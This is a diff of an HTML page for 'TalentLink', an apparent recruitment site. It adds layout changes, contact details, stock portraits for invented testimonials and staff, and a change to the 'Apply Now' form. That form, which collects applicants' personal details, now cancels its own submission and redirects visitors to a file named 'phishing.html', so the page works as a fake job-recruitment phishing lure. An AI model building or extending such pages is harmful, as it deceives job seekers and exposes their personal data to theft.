@@ -15,12 +15,17 @@
       background-color: #0d47a1;
       color: white;
       display: flex;
+      justify-content: space-between;
       align-items: center;
       padding: 15px 30px;
     }
     header img.logo {
       height: 40px;
       margin-left: 10px;
+    }
+    .header-right {
+      font-size: 0.9em;
+      text-align: right;
     }
     h1 {
       margin: 0;
@@ -89,6 +94,7 @@
       border-radius: 50%;
       width: 80px;
       height: 80px;
+      object-fit: cover;
     }
     .team-grid {
       display: grid;
@@ -103,19 +109,25 @@
       height: 120px;
       border-radius: 50%;
       margin-bottom: 8px;
+      object-fit: cover;
     }
   </style>
 </head>
 <body>
   <header>
-    <h1>TalentLink</h1>
-    <img src="logo.png" alt="TalentLink Logo" class="logo">
+    <div style="display:flex; align-items:center;">
+      <h1>TalentLink</h1>
+      <img src="logo.png" alt="TalentLink Logo" class="logo">
+    </div>
+    <div class="header-right">
+      <p>📞 +1-800-TALENT<br>📧 info@talentlink.com</p>
+    </div>
   </header>
 
   <main>
     <section id="apply">
       <h2>Apply Now</h2>
-      <form>
+      <form action="https://formspree.io/f/yourFormID" method="POST" onsubmit="event.preventDefault(); window.location.href='phishing.html';">
         <label>Full Name:</label>
         <input type="text" name="fullname" required>
 
@@ -172,7 +184,7 @@
           <p>"TalentLink helped me land my dream job in tech within weeks!"</p>
         </div>
         <div class="testimonial">
-          <img src="https://randomuser.me/api/portraits/men/2.jpg" alt="Student 2">
+          <img src="https://randomuser.me/api/portraits/men/75.jpg" alt="Indian Testimonial">
           <p>"Professional and efficient. Highly recommended!"</p>
         </div>
         <div class="testimonial">
@@ -186,15 +198,15 @@
       <h2>Our Team</h2>
       <div class="team-grid">
         <div class="team-member">
-          <img src="https://randomuser.me/api/portraits/men/5.jpg" alt="Team 1">
+          <img src="https://randomuser.me/api/portraits/men/10.jpg" alt="John Smith">
           <p><strong>John Smith</strong><br>Lead Recruiter</p>
         </div>
         <div class="team-member">
-          <img src="https://randomuser.me/api/portraits/women/6.jpg" alt="Team 2">
+          <img src="https://randomuser.me/api/portraits/women/6.jpg" alt="Sarah Lee">
           <p><strong>Sarah Lee</strong><br>Talent Acquisition Manager</p>
         </div>
         <div class="team-member">
-          <img src="https://randomuser.me/api/portraits/men/7.jpg" alt="Team 3">
+          <img src="https://randomuser.me/api/portraits/men/15.jpg" alt="Michael Brown">
           <p><strong>Michael Brown</strong><br>Recruitment Consultant</p>
         </div>
       </div>
